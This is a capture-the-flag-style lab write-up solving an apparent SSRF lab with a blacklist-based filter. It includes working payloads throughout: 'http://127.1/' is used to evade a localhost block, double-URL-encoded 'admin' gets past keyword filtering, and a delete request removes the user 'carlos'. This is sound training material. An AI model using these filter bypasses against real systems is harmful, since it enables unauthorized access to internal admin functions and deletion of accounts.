![4](https://github.com/Knign/Write-ups/assets/110326359/6ae639a7-86b3-4d80-bf1c-44da8a26a765)---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 4
---

![1](https://github.com/Knign/Write-ups/assets/110326359/fb708aaa-65ca-4de1-bd08-c26be142584a)

Let's check out the stock.

![2](https://github.com/Knign/Write-ups/assets/110326359/95f8aa50-fafe-4aa5-b532-13118d26abc1)

We can intercept the request using Burpsuite.

![3](https://github.com/Knign/Write-ups/assets/110326359/404e9755-cfff-48e6-8663-084ff35ba964)

Let's send the request to the `Repeater`.

We can set the `stockApi` field to the following and send the request:

```
http://localhost/admin
```

![4](https://github.com/Knign/Write-ups/assets/110326359/23b1b28b-5db1-43b5-8d17-aaf931166127)

So that request is blocked.

Let's send the following request:

```
http://127.1/
```

That returns a valid response.

Let's try visiting the `/admin` page.

```
http://127.1/admin
```

![7](https://github.com/Knign/Write-ups/assets/110326359/633f6f33-c540-4095-82c3-d85daef9a2db)

Looks like the `admin` keyword is being pattern-matched and blocked.
We can get around it by double URL encoding the string.

![10](https://github.com/Knign/Write-ups/assets/110326359/0e9aa7c9-05f8-419d-b4a2-5a5ea6c13a4e)

Let's now send the following request:

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

![9](https://github.com/Knign/Write-ups/assets/110326359/099a7a29-fd61-4e3b-a3f8-55fc2fd3ecc3)

We can now delete the `carlos` user.

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

![11](https://github.com/Knign/Write-ups/assets/110326359/54f70884-0935-4b68-be82-03928025b356)

We have solved the lab.

![12](https://github.com/Knign/Write-ups/assets/110326359/88b224e6-d665-415a-85a4-1ec27f3f5fae)
